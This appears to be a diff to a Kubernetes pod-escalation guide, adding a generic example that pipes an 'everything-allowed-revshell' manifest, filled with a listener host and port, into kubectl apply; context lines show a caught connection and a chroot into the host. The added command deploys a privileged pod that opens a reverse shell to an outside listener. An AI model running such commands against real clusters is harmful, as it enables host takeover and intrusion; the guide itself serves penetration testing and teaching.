@@ -88,6 +88,13 @@ Connection received on 10.0.0.162 42035
 # chroot /host
 ```
 
+Generic resource type creation example (replace [RESOURCE_TYPE] with deployment, statefulset, job, etc.): 
+```
+```bash
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
+```
+
+
 ## Deleting Resources
 You can delete a resource using it's manifest, or by name: 
 ```
